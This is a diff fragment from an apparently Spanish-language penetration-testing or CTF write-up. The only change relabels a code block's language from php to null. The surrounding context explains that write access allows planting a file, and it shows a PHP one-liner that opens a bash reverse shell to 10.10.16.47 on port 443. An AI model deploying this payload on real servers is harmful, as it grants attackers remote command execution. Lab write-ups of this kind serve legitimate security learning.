@@ -170,7 +170,7 @@ bash
 
 Como hay capacidad de escritura, es posible crear un archivo que envíe una reverse shell a mi equipo
 
-```php
+```null
 <?php
         system("bash -c 'bash -i >& /dev/tcp/10.10.16.47/443 0>&1'");
 ?>
